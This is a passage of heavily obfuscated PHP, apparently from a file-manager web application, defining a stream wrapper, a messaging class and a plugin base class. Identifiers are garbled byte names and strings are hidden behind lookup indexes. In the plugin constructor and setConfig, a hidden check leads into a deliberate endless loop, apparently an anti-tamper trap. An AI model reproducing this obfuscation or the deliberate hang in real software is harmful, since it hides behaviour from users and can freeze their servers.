(!IO::exist($ü ›°Ï¢)) { return !1; } $ÖË·€åô = json_decode(IO::getContent($ü ›°Ï¢), !0); if (empty($ÖË·€åô)) { return !1; } $½¬ãıÙ = array(); foreach ($ÖË·€åô as $ŒÄî«•® => $ §·Ù“) { $œ§ş£š¾ = Mcrypt::decode($ §·Ù“, $Æøü™¤ß); $½¬ãıÙ[$œ§ş£š¾] = $ŒÄî«•®; } if ($Ùñ·í±) { IO::remove($ü ›°Ï¢, !1); } return $½¬ãıÙ; } } goto c¯çµ¸÷†ô; Fó«¤ÔÙÒà: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($åº˜Û×œ, $Íœ¨ï° = '') { $this->info = $this->info($åº˜Û×œ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[€ä¾™²][87]]; $this->pathOpen = $åº˜Û×œ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$åº˜Û×œ])) { self::$_chunkBuffer[$åº˜Û×œ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ŒÆº¢’¿) { $Ç¹Ñ¥— = $this->fileSubstr($this->pose, $ŒÆº¢’¿); $this->pose += strlen($Ç¹Ñ¥—); return $Ç¹Ñ¥—; } public function stream_tell() { return $this->pose; } public function stream_seek($‡ûÛÃ, $›ôÙÇ´‹) { $ÕÉòÁ° =& $_SERVER[€ä¾™²]; if ($›ôÙÇ´‹ == SEEK_SET) { $this->pose = $‡ûÛÃ; } else { if ($›ôÙÇ´‹ == SEEK_CUR) { $this->pose += $‡ûÛÃ; } else { if ($›ôÙÇ´‹ == SEEK_END) { $this->pose = $this->info[$ÕÉòÁ°[79]] + intval($‡ûÛÃ); } } } if ($‡ûÛÃ < 0) { $this->pose = $this->info[$ÕÉòÁ°[79]] + $‡ûÛÃ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[€ä¾™²][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($‹øòğ©Š, $·†î§¿) { $‘´Âğø =& $_SERVER[€ä¾™²]; $ÜùŞÜÉö = $this->info($‹øòğ©Š); return array($‘´Âğø[1458] => 0, $‘´Âğø[1758] => 0, $‘´Âğø[16] => 32768 + 511, $‘´Âğø[1759] => 0, $‘´Âğø[1760] => 0, $‘´Âğø[1761] => 0, $‘´Âğø[1762] => 0, $‘´Âğø[79] => $ÜùŞÜÉö[$‘´Âğø[79]], $‘´Âğø[1763] => $ÜùŞÜÉö[$‘´Âğø[1608]], $‘´Âğø[1720] => $ÜùŞÜÉö[$‘´Âğø[88]], $‘´Âğø[1719] => $ÜùŞÜÉö[$‘´Âğø[232]], $‘´Âğø[1764] => 0, $‘´Âğø[1765] => 0); } static $fileInfo = array(); public function info($È€¹«Š) { $ò˜ƒúªº = $_SERVER[€ä¾™²][1766]; if (isset(self::$fileInfo[$È€¹«Š])) { return self::$fileInfo[$È€¹«Š]; } if (substr($È€¹«Š, 0, strlen($ò˜ƒúªº)) != $ò˜ƒúªº) { return !1; } self::$fileInfo[$È€¹«Š] = IO::info(substr($È€¹«Š, strlen($ò˜ƒúªº))); return self::$fileInfo[$È€¹«Š]; } public static function read($²“±™Êç, $ÃÕê¶ñ, $Ì‡›¬¶¶) { if (!isset(self::$_fopenCache[$²“±™Êç])) { $Æ‚‹’­ª = new StreamWrapperIO(); $Æ‚‹’­ª->stream_open($²“±™Êç); self::$_fopenCache[$²“±™Êç] = $Æ‚‹’­ª; } $Æ‚‹’­ª = self::$_fopenCache[$²“±™Êç]; return $Æ‚‹’­ª->fileSubstr($ÃÕê¶ñ, $Ì‡›¬¶¶); } public static function _read($§¸ÁÎÖå, $àÁ¸™Ù³, $¾¡–çÒÅ) { $””çĞø¾ =& $_SERVER[€ä¾™²]; $ƒÃ¶ˆæ = fopen($§¸ÁÎÖå, $””çĞø¾[1612]); if (!$ƒÃ¶ˆæ) { return $””çĞø¾[12]; } $¶œ‡õ¯– = 8192; fseek($ƒÃ¶ˆæ, $àÁ¸™Ù³, SEEK_SET); $÷Š›«ÏÀ = $””çĞø¾[12]; $û‡èÂÜœ = 0; while ($û‡èÂÜœ < $¾¡–çÒÅ) { $åêÏ­÷ù = min($¶œ‡õ¯–, $¾¡–çÒÅ - $û‡èÂÜœ); $÷Š›«ÏÀ .= fread($ƒÃ¶ˆæ, $åêÏ­÷ù); $û‡èÂÜœ += $åêÏ­÷ù; } fclose($ƒÃ¶ˆæ); return $÷Š›«ÏÀ; } public function fileSubstr($ÜÓàşÁå, $ú¢–ıØ) { $…ÔàÉ ù =& $_SERVER[€ä¾™²]; $°´£‰§ = $this->info[$…ÔàÉ ù[79]]; $çÛ¾ˆº’ = $ÜÓàşÁå; $”µ¶ÕÕ = $ú¢–ıØ; if ($ÜÓàşÁå < 0) { $ÜÓàşÁå = $°´£‰§ + $ÜÓàşÁå; } if ($ú¢–ıØ === !1) { $ú¢–ıØ = $°´£‰§ - $ÜÓàşÁå; } if ($ÜÓàşÁå + $ú¢–ıØ > $°´£‰§) { $ú¢–ıØ = $°´£‰§ - $ÜÓàşÁå; } if ($ú¢–ıØ <= 0) { return $…ÔàÉ ù[12]; } if ($ÜÓàşÁå < 0 || $ÜÓàşÁå >= $°´£‰§ || $ú¢–ıØ <= 0 || $ú¢–ıØ > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\106\151\x6c\x65\x52\x65\x61\x64\40\145\162\x72\x6f\162\x21\40\x73\164\141\x72\x74\75{$ÜÓàşÁå}\x3b\154\145\156\147\x74\x68\75{$ú¢–ıØ}\73\x20\x73\x69\x7a\x65\x3d{$°´£‰§}\73"); } $Î©ìõĞÍ = 64 * 1024; $«‡“¤ë½ =& self::$_chunkBuffer[$this->path]; if (!$«‡“¤ë½) { $«‡“¤ë½ = array(); } $çÁæ¡ô¸ = 0; $ç–¸€û¾ = 0; $îü¤ö–× = $…ÔàÉ ù[12]; foreach ($«‡“¤ë½ as $çÁæ¡ô¸ => $îü¤ö–×) { $çÁæ¡ô¸ = intval($çÁæ¡ô¸); $ç–¸€û¾ = $çÁæ¡ô¸ + strlen($îü¤ö–×); if ($ÜÓàşÁå >= $ç–¸€û¾) { continue; } if ($ÜÓàşÁå >= $çÁæ¡ô¸ && $ÜÓàşÁå + $ú¢–ıØ <= $ç–¸€û¾) { return substr($îü¤ö–×, $ÜÓàşÁå - $çÁæ¡ô¸, $ú¢–ıØ); } break; } if (count($«‡“¤ë½) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($…ÔàÉ ù[1767], $…ÔàÉ ù[1768] . count($«‡“¤ë½) . "\73\x73\x74\141\x72\164\x3d{$ÜÓàşÁå}\54\x6c\x65\156\x67\164\x68\75{$ú¢–ıØ}\73\x70\157\x73\145\72{$çÁæ¡ô¸}\x7e{$ç–¸€û¾}"); throw new Exception($…ÔàÉ ù[1769]); } $ùù°™© = intval($ÜÓàşÁå / $Î©ìõĞÍ) * $Î©ìõĞÍ; $Ñ­†…Ùè = ceil(($ÜÓàşÁå + $ú¢–ıØ) / $Î©ìõĞÍ) * $Î©ìõĞÍ - $ùù°™©; $•óŠ×ç› = IO::fileSubstr($this->path, $ùù°™©, $Ñ­†…Ùè); $«‡“¤ë½[$ùù°™© . $…ÔàÉ ù[12]] = $•óŠ×ç›; ksort($«‡“¤ë½); $Ù§à÷Ë° = substr($•óŠ×ç›, $ÜÓàşÁå - $ùù°™©, $ú¢–ıØ); return $Ù§à÷Ë°; } private function log($ ¼àÀë, $­ØÑ­îö) { $ó×Ëñ÷ä =& $_SERVER[€ä¾™²]; $¦¯¢¥úó = timeFloat() - $this->timeStart; write_log(sprintf($ó×Ëñ÷ä[1770], $ ¼àÀë, $this->info[$ó×Ëñ÷ä[32]], $¦¯¢¥úó, $­ØÑ­îö), $ó×Ëñ÷ä[1314]); } } class Message { function __construct() { } public function send($ßíœ‡í = '', $—ÖĞÎ = array(), $…©³ = "\164\145\x78\164") { $­¼÷Á’¤ =& $_SERVER[€ä¾™²]; $¦™‚¬Àë = array($­¼÷Á’¤[33] => $­¼÷Á’¤[1234], $­¼÷Á’¤[169] => $ßíœ‡í); if (in_array($…©³, array($­¼÷Á’¤[1234], $­¼÷Á’¤[1771]))) { $¦™‚¬Àë[$­¼÷Á’¤[33]] = $…©³; } $—ÖĞÎ = array($­¼÷Á’¤[605] => isset($—ÖĞÎ[$­¼÷Á’¤[605]]) ? $—ÖĞÎ[$­¼÷Á’¤[605]] : $­¼÷Á’¤[12], $­¼÷Á’¤[691] => isset($—ÖĞÎ[$­¼÷Á’¤[691]]) ? $—ÖĞÎ[$­¼÷Á’¤[691]] : $­¼÷Á’¤[12]); if (empty($ßíœ‡í) || empty($—ÖĞÎ[$­¼÷Á’¤[605]]) && empty($—ÖĞÎ[$­¼÷Á’¤[691]])) { return !1; } $ÃÇ“É = array($­¼÷Á’¤[1700] => $¦™‚¬Àë, $­¼÷Á’¤[1772] => $—ÖĞÎ); Hook::trigger($­¼÷Á’¤[1773], $ÃÇ“É); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ÔÙŞ££ =& $_SERVER[€ä¾™²]; if (!isset($_SERVER[$ÔÙŞ££[491]]) || !isset($_SERVER[$ÔÙŞ££[492]])) { $·åİáÃø = $ÔÙŞ££[989]; $»±…†¡´ = $ÔÙŞ££[493]; $«Ú£ÔÖ  = $_SERVER[$ÔÙŞ££[494]] . $ÔÙŞ££[495]; $ÏàÂüÛ = $»±…†¡´($«Ú£ÔÖ ); $šäüáÙÌ = explode($ÔÙŞ££[286], $ÏàÂüÛ); if (count($šäüáÙÌ) < $ÔÙŞ££[722]) { $Ò—”×Âñ = $ÔÙŞ££[497]; $Ò—”×Âñ(); } $¨¯çÏ‚ğ = $ÔÙŞ££[990]; $¨¯çÏ‚ğ($_SERVER[$ÔÙŞ££[991]]); $ ƒİƒÖ  = 1; for ($šÉ˜€Ã‘ = $ ƒİƒÖ ; $šÉ˜€Ã‘ > 0; $šÉ˜€Ã‘++) { $¨¯çÏ‚ğ = json_encode($GLOBALS[$ÔÙŞ££[514]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ÔÙŞ££[1774]); $this->pluginName = str_replace($ÔÙŞ££[1774], $ÔÙŞ££[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ÔÙŞ££[8]; $this->pluginApi = appHostGet() . $ÔÙŞ££[1775] . $this->pluginName . $ÔÙŞ££[8]; $this->pluginHost = $config[$ÔÙŞ££[1776]] . $this->pluginName . $ÔÙŞ££[8]; $this->pluginHostDefault = $config[$ÔÙŞ££[1776]] . $this->pluginName . $ÔÙŞ££[8]; $ßæÙŒœò = $config[$ÔÙŞ££[1777]]; if ($ßæÙŒœò && strpos($ÔÙŞ££[50] . $ßæÙŒœò . $ÔÙŞ££[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ÔÙŞ££[1778]] . $this->pluginName . $ÔÙŞ££[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[€ä¾™²][1779]); } protected function assign($Éä÷–´¯, $È•ğ´‹„ = false) { if (is_array($Éä÷–´¯)) { $this->values = array_merge($this->values, $Éä÷–´¯); } else { $this->values[$Éä÷–´¯] = $È•ğ´‹„; } } protected function display($ƒÕµâËß) { extract($this->values); require $ƒÕµâËß; } final function hookRegist($ä„‹‹›¸) { $this->modelPlugin->appRegist($this->pluginName, $ä„‹‹›¸); } final function appIcon() { $‰ÆğâÑ =& $_SERVER[€ä¾™²]; $ö‡»÷ = $this->appPackage(); $€Àîçá¸ = $‰ÆğâÑ[12]; if (isset($ö‡»÷[$‰ÆğâÑ[512]])) { if (isset($ö‡»÷[$‰ÆğâÑ[512]][$‰ÆğâÑ[1780]])) { $€Àîçá¸ = $‰ÆğâÑ[1781] . $ö‡»÷[$‰ÆğâÑ[512]][$‰ÆğâÑ[1780]] . $‰ÆğâÑ[1782]; } else { if ($ö‡»÷[$‰ÆğâÑ[512]][$‰ÆğâÑ[1783]]) { $€Àîçá¸ = $‰ÆğâÑ[1784] . $ö‡»÷[$‰ÆğâÑ[512]][$‰ÆğâÑ[1783]] . $‰ÆğâÑ[1785]; } } } return $€Àîçá¸; } final function fileCanView($¼ÊÏ†éŸ) { $°­ÂÒ£¦ =& $_SERVER[€ä¾™²]; if (request_url_safe($¼ÊÏ†éŸ)) { return !0; } if ($this->isShare($¼ÊÏ†éŸ)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $„òœóöÇ = $°­ÂÒ£¦[1786] . rawurlencode(this_url()); show_tips(LNG($°­ÂÒ£¦[1787]) . $°­ÂÒ£¦[1788] . $„òœóöÇ . $°­ÂÒ£¦[1789] . LNG($°­ÂÒ£¦[1790]) . $°­ÂÒ£¦[1791], !1); } if (!Action($°­ÂÒ£¦[1792])->authCan($°­ÂÒ£¦[1793])) { show_tips(LNG($°­ÂÒ£¦[1794]) . $°­ÂÒ£¦[1795], !1); } ActionCall($°­ÂÒ£¦[1796], $¼ÊÏ†éŸ); } final function isShare($Äõï“¿ã) { $´¦ñ£ó€ = KodIO::parse($Äõï“¿ã); return $´¦ñ£ó€[$_SERVER[€ä¾™²][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Î–ı’³ö) { if (request_url_safe($Î–ı’³ö)) { return $Î–ı’³ö; } if (!$this->isShare($Î–ı’³ö)) { $Î–ı’³ö = $this->filePath($Î–ı’³ö, !1); } return Action($_SERVER[€ä¾™²][1306])->linkOut($Î–ı’³ö); } public function filePathLinkOut($¼ŠÇµó…) { if (request_url_safe($¼ŠÇµó…)) { return $¼ŠÇµó…; } $this->fileCanView($¼ŠÇµó…); return Action($_SERVER[€ä¾™²][1306])->link($¼ŠÇµó…); } final function filePath($ı¹ñÂ£, $òø’€–Ø = true, $„´î¡Çª = false) { $íÖÅ¥§ =& $_SERVER[€ä¾™²]; $³¢Ô³‚ø = $this->filePathGet($ı¹ñÂ£, $òø’€–Ø); if (!$this->fileInfo) { show_tips(LNG($íÖÅ¥§[106]), !1); } if ($„´î¡Çª && isset($this->fileInfo[$íÖÅ¥§[564]]) && $this->fileInfo[$íÖÅ¥§[564]]) { $Ü¡øèÓ  = Model($íÖÅ¥§[567])->fileInfo($this->fileInfo[$íÖÅ¥§[564]]); if (!$Ü¡øèÓ  || !IO::exist($Ü¡øèÓ [$íÖÅ¥§[87]])) { $àÔÌ»â = LNG($íÖÅ¥§[106]) . LNG($íÖÅ¥§[1797]); if (KodUser::isRoot() && isset($Ü¡øèÓ [$íÖÅ¥§[87]])) { $àÔÌ»â .= $íÖÅ¥§[1798] . $Ü¡øèÓ [$íÖÅ¥§[87]] . $íÖÅ¥§[1799]; } show_tips($àÔÌ»â); } } Hook::trigger($íÖÅ¥§[1800], $³¢Ô³‚ø); return $³¢Ô³‚ø; } final function filePathGet($·³š©¿Ş, $¢¯‡íß½ = true) { $¾¤¯¤­Ş =& $_SERVER[€ä¾™²]; if ($ä‘£Üèİ = $this->checkSharePath($·³š©¿Ş, $¢¯‡íß½)) { return $ä‘£Üèİ; } $this->fileCanView($·³š©¿Ş); if (request_url_safe($·³š©¿Ş)) { $°ª¥Õõ¶ = parse_url_query($·³š©¿Ş); if (isset($°ª¥Õõ¶[$¾¤¯¤­Ş[1801]]) && isset($°ª¥Õõ¶[$¾¤¯¤­Ş[235]])) { $ó¶øó·Ÿ = Mcrypt::decode($°ª¥Õõ¶[$¾¤¯¤­Ş[235]], Model($¾¤¯¤­Ş[873])->get($¾¤¯¤­Ş[874])); if ($ó¶øó·Ÿ) { $this->fileInfo = IO::info($ó¶øó·Ÿ); $this->fileInfo[$¾¤¯¤­Ş[1802]] = $·³š©¿Ş; $this->cachePath = $this->pluginCachePath($¾¤¯¤­Ş[12], $¢¯‡íß½); return $ó¶øó·Ÿ; } } $·³š©¿Ş = $this->_cacheHttpFile($·³š©¿Ş, $¢¯‡íß½); $this->fileInfo = IO::info($·³š©¿Ş); } else { $this->fileInfo = IO::info($·³š©¿Ş); $this->cachePath = $this->pluginCachePath($¾¤¯¤­Ş[12], $¢¯‡íß½); } return $·³š©¿Ş; } final function _cacheHttpFile($¢«¯Úğ, $­„ßû¶¥ = true) { $–µ§Íª— =& $_SERVER[€ä¾™²]; $ò„Ìİ¼ = parse_url_query($¢«¯Úğ); $ÇµËØ” = get_path_ext($¢«¯Úğ); if (isset($ò„Ìİ¼[$–µ§Íª—[32]]) && $ò„Ìİ¼[$–µ§Íª—[32]]) { $ÇµËØ” = get_path_ext($ò„Ìİ¼[$–µ§Íª—[32]]); } $õ€úÂ†Š = hash_path($¢«¯Úğ) . $–µ§Íª—[10] . $ÇµËØ”; $this->cachePath = $this->pluginCachePath($­„ßû¶¥ ? $õ€úÂ†Š : $–µ§Íª—[12]); $ˆàÑÅÎŸ = IO::fileNameExist($this->cachePath, $õ€úÂ†Š); if ($ˆàÑÅÎŸ) { return KodIO::make($ˆàÑÅÎŸ); } $Â•ôÕ„µ = rtrim($this->cachePath, $–µ§Íª—[8]) . $–µ§Íª—[8] . $õ€úÂ†Š; return $this->pluginCacheFileSet($Â•ôÕ„µ, file_get_contents_nossl($¢«¯Úğ)); } final function checkSharePath($¡İ„İÏ, $Ş‘ôıŒ = true) { $çæÕ×â =& $_SERVER[€ä¾™²]; if (!$this->isShare($¡İ„İÏ)) { return !1; } $äåš›Ûä = Action($çæÕ×â[1306])->sharePathInfo($¡İ„İÏ); if (!is_array($äåš›Ûä) || !isset($äåš›Ûä[$çæÕ×â[87]])) { $ÎÑ†û’‚ = $GLOBALS[$çæÕ×â[1803]]; show_json($ÎÑ†û’‚ ? $ÎÑ†û’‚ : LNG($çæÕ×â[1804]), !1); } $this->fileInfo = $äåš›Ûä; $this->cachePath = $this->pluginCachePath(!1, $Ş‘ôıŒ); return $äåš›Ûä[$çæÕ×â[87]]; } final function pluginCachePath($ˆú„Ãù = '', $²¬ÂÀÊ— = false) { $Õ³¼…• =& $_SERVER[€ä¾™²]; if ($²¬ÂÀÊ— && is_array($this->fileInfo)) { $ˆú„Ãù = kodIO::hashPath($this->fileInfo); } $¥Ó¢ì“ú = rtrim(IO_PATH_SYSTEM_TEMP . $Õ³¼…•[1805] . $this->pluginName . $Õ³¼…•[8] . $ˆú„Ãù, $Õ³¼…•[8]); $ô›õ¬“Ë = IO::infoFullSimple($¥Ó¢ì“ú); $ÉëÁæ—Ï = $ô›õ¬“Ë && is_array($ô›õ¬“Ë) ? $ô›õ¬“Ë[$Õ³¼…•[87]] : $Õ³¼…•[12]; if (!$ÉëÁæ—Ï) { $ÉëÁæ—Ï = IO::mkdir($¥Ó¢ì“ú); } return $ÉëÁæ—Ï; } final function pluginCacheFileSet($ë”ê£ô, $Ìû¦ÇÈ = '') { $¹ù©ªêì =& $_SERVER[€ä¾™²]; $ÊÊ—¹™ = IO::infoFullSimple($ë”ê£ô); if (!$ÊÊ—¹™) { return IO::mkfile($ë”ê£ô, $Ìû¦ÇÈ, REPEAT_REPLACE); } IO::setContent($ÊÊ—¹™[$¹ù©ªêì[87]], $Ìû¦ÇÈ); return $ÊÊ—¹™[$¹ù©ªêì[87]]; } final function pluginLocalFile($³«çÜÂ = '') { $÷½ñû¼— =& $_SERVER[€ä¾™²]; $ıı›¸éÇ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($ıı›¸éÇ)) { mk_dir($ıı›¸éÇ); } if (!$³«çÜÂ) { return $ıı›¸éÇ; } $—¹êä÷œ = IO::info($³«çÜÂ); $´õ‡®¶‘ = $÷½ñû¼—[1806] . KodIO::hashPath($—¹êä÷œ) . $÷½ñû¼—[10] . $—¹êä÷œ[$÷½ñû¼—[167]]; if (!checkExtSafe($´õ‡®¶‘)) { $´õ‡®¶‘ = $´õ‡®¶‘ . $÷½ñû¼—[1340]; } $€à¿à¸İ = $ıı›¸éÇ . $´õ‡®¶‘; if (@file_exists($€à¿à¸İ)) { return $€à¿à¸İ; } return IO::copy($³«çÜÂ, $ıı›¸éÇ, 0, $´õ‡®¶‘); } final function appPackage() { $¨Ø¶•‡ü =& $_SERVER[€ä¾™²]; if ($this->packageData) { return $this->packageData; } $¾èì€šı = $this->parseFile($this->pluginPath . $¨Ø¶•‡ü[1807]); $this->parseLang($¾èì€šı); $üì½ıÜÓ = json_decode_force($¾èì€šı); if (!$üì½ıÜÓ) { return array(); } $ÃëÍÇÉÌ = Hook::filter($¨Ø¶•‡ü[1808], $üì½ıÜÓ); if ($ÃëÍÇÉÌ && is_array($ÃëÍÇÉÌ)) { $üì½ıÜÓ = $ÃëÍÇÉÌ; } $this->packageData = $üì½ıÜÓ; return $üì½ıÜÓ; } public function packageInfoGet($ÉÅÁŞ¢) { $íÄø·´¬ = $this->appPackage(); return array_get_value($íÄø·´¬, $ÉÅÁŞ¢); } public function packageVersion() { return $this->packageInfoGet($_SERVER[€ä¾™²][1809]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[€ä¾™²][1810]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[€ä¾™²][1811]); } public function echoJsAssign($¥ÜãÈå, $†À‚ë³†) { $this->echoJsAssignArr[$¥ÜãÈå] = $†À‚ë³†; } private function parseFile($Á¸™×±Ó) { $ãù‘ìå =& $_SERVER[€ä¾™²]; $çª²³´ƒ = file_get_contents_nossl($Á¸™×±Ó); $Å¶©éúÇ = array($ãù‘ìå[1812], $ãù‘ìå[1813], $ãù‘ìå[1814], $ãù‘ìå[1815], $ãù‘ìå[1816], $ãù‘ìå[1817], $ãù‘ìå[1818]); $´ø¼ô¹£ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ãù‘ìå[92]][$ãù‘ìå[1819]]); foreach ($this->echoJsAssignArr as $ŠõÍ× ª => $áĞÁÀß ) { $Å¶©éúÇ[] = $ãù‘ìå[1820] . $ŠõÍ× ª . $ãù‘ìå[1821]; $´ø¼ô¹£[] = is_array($áĞÁÀß ) || is_object($áĞÁÀß ) ? rawurlencode(json_encode($áĞÁÀß )) : $áĞÁÀß ; } if (strstr($çª²³´ƒ, $ãù‘ìå[1822])) { $­¾²Ö’† = rawurlencode(json_encode($this->pluginLangArr)); $çª²³´ƒ = str_replace($ãù‘ìå[1822], $­¾²Ö’†, $çª²³´ƒ); } if (strstr($çª²³´ƒ, $ãù‘ìå[1823])) { $­¾²Ö’† = $­¾²Ö’† = rawurlencode(json_encode($this->getConfig())); $çª²³´ƒ = str_replace($ãù‘ìå[1823], $­¾²Ö’†, $çª²³´ƒ); } $çª²³´ƒ = str_replace($Å¶©éúÇ, $´ø¼ô¹£, $çª²³´ƒ); return $çª²³´ƒ; } private function parseLang(&$šÍÊ»â•) { $§×èÅ˜ =& $_SERVER[€ä¾™²]; $«Á–¤Øé = $§×èÅ˜[1824]; if (!strstr($šÍÊ»â•, $«Á–¤Øé)) { return; } preg_match_all($§×èÅ˜[1825], $šÍÊ»â•, $İˆ½Ù¥é); if (!is_array($İˆ½Ù¥é) || count($İˆ½Ù¥é) == 0 || !is_array($İˆ½Ù¥é[0]) || count($İˆ½Ù¥é[0]) == 0) { return; } $¼½Ó›¥® = array(); $ÖêÛÏõÕ = array(); foreach ($İˆ½Ù¥é[0] as $ŞÕ“›Â´) { $ÈˆıŠ«ä = substr($ŞÕ“›Â´, strlen($«Á–¤Øé), -4); $Îûİõéø = LNG($ÈˆıŠ«ä); $¼½Ó›¥®[] = $ŞÕ“›Â´; $ÖêÛÏõÕ[] = str_replace(array($§×èÅ˜[286], $§×èÅ˜[1193], $§×èÅ˜[418], $§×èÅ˜[119]), array($§×èÅ˜[53], $§×èÅ˜[53], $§×èÅ˜[12], $§×èÅ˜[1826]), $Îûİõéø); } $šÍÊ»â• = str_replace($¼½Ó›¥®, $ÖêÛÏõÕ, $šÍÊ»â•); } private function parseConfig(&$µ„¸…Æ²) { $ìÉÀŞóÜ =& $_SERVER[€ä¾™²]; $Œü²Í¶Ş = $ìÉÀŞóÜ[1827]; if (!strstr($µ„¸…Æ², $Œü²Í¶Ş)) { return; } preg_match_all($ìÉÀŞóÜ[1828], $µ„¸…Æ², $ıÎ™½áÊ); if (!is_array($ıÎ™½áÊ) || count($ıÎ™½áÊ) == 0 || !is_array($ıÎ™½áÊ[0]) || count($ıÎ™½áÊ[0]) == 0) { return; } $½º°éõÁ = $this->getConfig(); $Â¹¨àò = array(); $Ë´Ø® Ä = array(); foreach ($ıÎ™½áÊ[0] as $†»Š·÷´) { $äÅıÂ§” = substr($†»Š·÷´, strlen($Œü²Í¶Ş), -2); $Â¹¨àò[] = $†»Š·÷´; $Ë´Ø® Ä[] = _get($½º°éõÁ, $äÅıÂ§”); } $µ„¸…Æ² = str_replace($Â¹¨àò, $Ë´Ø® Ä, $µ„¸…Æ²); } private function parsePackage(&$€÷’·é) { $ëÓ´œÕò =& $_SERVER[€ä¾™²]; $çïêı»ã = $ëÓ´œÕò[1829]; if (!strstr($€÷’·é, $çïêı»ã)) { return; } preg_match_all($ëÓ´œÕò[1830], $€÷’·é, $ñœËóÚÅ); if (!is_array($ñœËóÚÅ) || count($ñœËóÚÅ) == 0 || !is_array($ñœËóÚÅ[0]) || count($ñœËóÚÅ[0]) == 0) { return; } $ÕášÎ» = $this->appPackage(); $›ºõÍ†… = array(); $‡ğõÈ = array(); foreach ($ñœËóÚÅ[0] as $±ÕçóÅô) { $‡¢ğÊĞÒ = substr($±ÕçóÅô, strlen($çïêı»ã), -2); $›ºõÍ†…[] = $±ÕçóÅô; $‡ğõÈ[] = _get($ÕášÎ», $‡¢ğÊĞÒ); } $€÷’·é = str_replace($›ºõÍ†…, $‡ğõÈ, $€÷’·é); } final function echoFile($ú¶•ïëº, $¼†¤ß‘ = false) { $“ñÜŸ£Ì =& $_SERVER[€ä¾™²]; $©Ã·É—³ = $this->pluginPath . $ú¶•ïëº; if (ACT == $“ñÜŸ£Ì[1831]) { echo $“ñÜŸ£Ì[1832] . $this->pluginName . $“ñÜŸ£Ì[8] . $ú¶•ïëº . $“ñÜŸ£Ì[1833]; if (!file_exists($©Ã·É—³)) { echo $“ñÜŸ£Ì[1834]; return; } } $Óï°şñª = $this->parseFile($©Ã·É—³); $this->parseLang($Óï°şñª); $this->parseConfig($Óï°şñª); $this->parsePackage($Óï°şñª); if (is_array($¼†¤ß‘)) { $Óï°şñª = str_replace(array_keys($¼†¤ß‘), array_values($¼†¤ß‘), $Óï°şñª); } echo $“ñÜŸ£Ì[286] . $Óï°şñª; } private function checkVersion() { $ÀÙ—ı»º =& $_SERVER[€ä¾™²]; $¿ ôâŒÑ = $this->appPackage(); $¨’Ô³Ú´ = $this->getConfig(); if ($¨’Ô³Ú´[$ÀÙ—ı»º[1835]] == $¿ ôâŒÑ[$ÀÙ—ı»º[1809]]) { return; } $this->regist(); $this->setConfig(array($ÀÙ—ı»º[1835] => $¿ ôâŒÑ[$ÀÙ—ı»º[1809]])); } final function initLang() { $ãÒí÷… =& $_SERVER[€ä¾™²]; $ØÖ¾®Ò… = $ãÒí÷…[1836]; $Õ„”–À¬ = $this->pluginPath . $ãÒí÷…[1837]; $ƒ¬Ñü‘î = I18n::getType(); $û±ø¦ = array(); if (file_exists($Õ„”–À¬ . $ƒ¬Ñü‘î . $ãÒí÷…[949])) { $û±ø¦ = (include $Õ„”–À¬ . $ƒ¬Ñü‘î . $ãÒí÷…[949]); } else { if ($ƒ¬Ñü‘î == $ãÒí÷…[1838] && !file_exists($Õ„”–À¬ . $ƒ¬Ñü‘î . $ãÒí÷…[949]) && file_exists($Õ„”–À¬ . $ãÒí÷…[1839])) { $û±ø¦ = (include $Õ„”–À¬ . $ãÒí÷…[1839]); $ƒ¬Ñü‘î = $ãÒí÷…[1655]; } else { if (file_exists($Õ„”–À¬ . $ØÖ¾®Ò… . $ãÒí÷…[949])) { $û±ø¦ = (include $Õ„”–À¬ . $ØÖ¾®Ò… . $ãÒí÷…[949]); $ƒ¬Ñü‘î = $ØÖ¾®Ò…; } } } if (!$û±ø¦ || !is_array($û±ø¦)) { $û±ø¦ = array(); } $‚¤±†àš = Hook::trigger($ãÒí÷…[1840], $û±ø¦, $this->pluginName, $ƒ¬Ñü‘î); if ($‚¤±†àš && is_array($‚¤±†àš)) { $û±ø¦ = $‚¤±†àš; } if (@count($û±ø¦) > 0) { I18n::set($û±ø¦); } return $û±ø¦; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($‰Ú½ÒÕ) { $ƒù½÷Õ£ =& $_SERVER[€ä¾™²]; if (!isset($_SERVER[$ƒù½÷Õ£[491]]) || !isset($_SERVER[$ƒù½÷Õ£[492]])) { $Â”ìòø› = $ƒù½÷Õ£[989]; $­íá’¡ = $ƒù½÷Õ£[493]; $ê²Ü½Ù¯ = $_SERVER[$ƒù½÷Õ£[494]] . $ƒù½÷Õ£[495]; $úŒƒ»á = $­íá’¡($ê²Ü½Ù¯); $³–Üç‹Ü = explode($ƒù½÷Õ£[286], $úŒƒ»á); if (count($³–Üç‹Ü) < $ƒù½÷Õ£[722]) { $¦—ˆÀŸ¾ = 